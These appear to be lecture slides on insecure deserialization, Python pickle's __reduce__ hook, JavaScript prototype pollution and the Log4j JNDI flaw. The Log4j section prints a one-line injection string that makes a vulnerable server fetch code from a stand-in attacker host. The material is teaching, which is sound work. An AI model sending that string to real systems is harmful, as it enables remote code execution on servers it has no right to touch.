## serialization

---

### what is serialization
* converting an object's state (data/structure) into a format that can be stored/transmitted.
* relatively straight-forward for simple types (e.g. strings, numbers), not so much others.
* all code is constantly serialized & stored in memory.

---

### can anyone think of examples of serialization
* writing data to files
  * csv
  * json
* storing stuff in a database
* sending data over a network
* a webserver receiving traffic 
* protobufs!!1

---

### is this exploitable
* not necessarily that dangerous
* this is control > data
* you're turning structures into some format

## deserialization

---
### what is it
* as expected, the opposite of serialization
* turning serialized data (e.g. a string) back into code/data structures/objects
* this is data > control

---

### type confusion
> when a program misinterprets the type of data its being provided

* this can cause crashes, memory corruption, unexpected behaviour (**the good stuff**)
* what if the program expects a specific type of object during deserialization, but receives something else

---

### what type of vulnerability is this
* the core problem is untrusted user input (what a surprise)
* this is both an "attacking implementation" vulnerability, and an attacking design vulnerability
* there may be vulnerabilities in the deserialization of a specific type of object (some examples here)

I turned myself into a
## python pickle

---

### what is it
pickle is a python serialization library which can be used to save objects (even complex ones like lists, dictionaries, and custom objects)

```
import pickle

class User:
    def __init__(self, name):
        self.name = name

user = User("Alice")
serialized_data = pickle.dumps(user)

deserialized_user = pickle.loads(serialized_data)
print(deserialized_user.name)
```

---

### what about for more complex types?
* If I have a **custom** type, I'll need some way to tell pickle how to serialize it
* Not every object will serialize well ([e.g. file handles](https://stackoverflow.com/a/19874769)). What would you store?
* We need some way for user's to specify how to deserialize non-simple types.

---

### how pickle does it
> To the [docs](https://docs.python.org/2/library/pickle.html#pickling-and-unpickling-extension-types).
* When serializing objects, pickle will call the `__reduce__` method on an object to determine what to store
* This function should return a tuple, containing a function to call, and it's arguments
* This function will be called when deserializing

---

### an example
* Say you have a custom Logger class, that writes to log files
* It might store a file handle, which can't be serialized
* Instead, when serializing, store the filehandle, and when deserializing, create an instance of the class with that file handle

---

### code
```
class Logger:
    def __init__(self, filename):
        self.filename = filename
        self.file = open(filename, "a")

    def log(self, message):
        self.file.write(message + "\n")
        self.file.flush()

    def __reduce__(self):
        # Return a tuple with the class constructor and its arguments
        return (self.__class__, (self.filename,))

# Create a logger instance
logger = Logger("log.txt")

# Pickle the logger
with open("logger.pkl", "wb") as file:
    pickle.dump(logger, file)

# Later, unpickle it
with open("logger.pkl", "rb") as file:
    loaded_logger = pickle.load(file)

# The file is reopened correctly!
loaded_logger.log("This is a test log after unpickling.")
```

## prototype pollution

---

### inheritance
* for compiled languages like java, relationships are well-defined at **compile time**
* for interpreted languages, these relationships must be able to change at **runtime**

---

### kinda similar to mro in python
* javascript doesn't have traditional class-based multiple inheritance
* instead it has prototype chaining (& mixins)
* **all objects lead back to the same prototype**

---

### how are attributes resolved?
1. own properties
2. its prototype ("parent")
3. its prototypes prototype
4. so on
similarly
---

### how to exploit this?
* what if we changed the prototype of one object
* would it [ae]ffect others?

```
Object.prototype.test = "This is dangerous!";

const obj = {};
console.log(obj.test); // "This is dangerous!"
```

what about:
```
let a = {}, b = {}
a.__proto__.test = 123

console.log(b.test); // 123
```

## log4j

---

### what was it
* quite similar to SSTI
* again improper input validation, this time in how log4j handled JNDI lookups

---

### what was the purpose of jndi
* it was used to access dynamic resources when the log is being created, e.g.
    * information about the server
    * accessing databases (via JDBC DataSources)
    * remote objects (e.g., RMI, CORBA)
    * ldap directories (for user authentication and configuration)
    * messaging services (like JMS)

---

### how was it exploited
* Essentially there was no input validation to ensure user's couldn't provide their own jndi lookups
* This meant you could get the package to call out and execute arbitrary java code (RCE)

```
${jndi:ldap://evil.attacker.com/malicious_payload}
```

---

### how bad was this
* What is the attack surface on this vulnerability?
* When do messages get logged?

---

### meme: an aside
how was it discovered
* It existed since 2013
* Idk if it's true, but I've heard it was first exploited against Minecraft servers
* [quick fix](https://github.com/apache/logging-log4j2/pull/608)
